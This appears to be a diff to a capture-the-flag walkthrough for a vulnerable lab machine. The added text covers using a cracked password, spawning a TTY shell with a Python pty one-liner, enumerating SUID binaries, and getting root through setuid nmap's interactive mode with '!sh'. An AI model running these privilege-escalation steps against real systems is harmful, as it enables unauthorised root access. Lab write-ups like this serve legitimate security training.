@@ -144,4 +144,51 @@ robot:c3fcd3d76192e4007dfb496cca67e13b
 Put the hash into crackstation, and we get the password:
 abcdefghijklmnopqrstuvwxyz
 
-(courtesy save)
+If we try and log in immediately with su robot, we are met with
+su: must be run from a terminal
+
+So first, spawn a TTY shell with:
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+Then, try su robot again
+(password at the prompt)
+
+Grab key 2 of 3
+
+Next, we should elevate our permissions and try and obtain root.
+
+Trying sudo -l only tells us we don'y have permission to run sudo.
+
+What about files with SUID set?
+
+find / -type f -perm -04000 -ls 2>/dev/null
+ 15068   44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping
+ 15093   68 -rwsr-xr-x   1 root     root        69120 Feb 12  2015 /bin/umount
+ 15060   96 -rwsr-xr-x   1 root     root        94792 Feb 12  2015 /bin/mount
+ 15069   44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6
+ 15085   40 -rwsr-xr-x   1 root     root        36936 Feb 17  2014 /bin/su
+ 36231   48 -rwsr-xr-x   1 root     root        47032 Feb 17  2014 /usr/bin/passwd
+ 36216   32 -rwsr-xr-x   1 root     root        32464 Feb 17  2014 /usr/bin/newgrp
+ 36041   44 -rwsr-xr-x   1 root     root        41336 Feb 17  2014 /usr/bin/chsh
+ 36038   48 -rwsr-xr-x   1 root     root        46424 Feb 17  2014 /usr/bin/chfn
+ 36148   68 -rwsr-xr-x   1 root     root        68152 Feb 17  2014 /usr/bin/gpasswd
+ 36349  152 -rwsr-xr-x   1 root     root       155008 Mar 12  2015 /usr/bin/sudo
+ 34835  496 -rwsr-xr-x   1 root     root       504736 Nov 13  2015 /usr/local/bin/nmap
+ 38768  432 -rwsr-xr-x   1 root     root       440416 May 12  2014 /usr/lib/openssh/ssh-keysign
+ 38526   12 -rwsr-xr-x   1 root     root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
+395259   12 -r-sr-xr-x   1 root     root         9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+395286   16 -r-sr-xr-x   1 root     root        14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+ 38505   12 -rwsr-xr-x   1 root     root        10344 Feb 25  2015 /usr/lib/pt_chown
+
+nmap seems to be the only option.
+
+However, I had no luck with the options on gtfobins, so I looked elsewhere and found this site:
+https://www.adamcouch.co.uk/linux-privilege-escalation-setuid-nmap/
+
+Run:
+nmap --interactive
+!whoami
+(should say root)
+!sh
+
+Now, go grab the last key!!
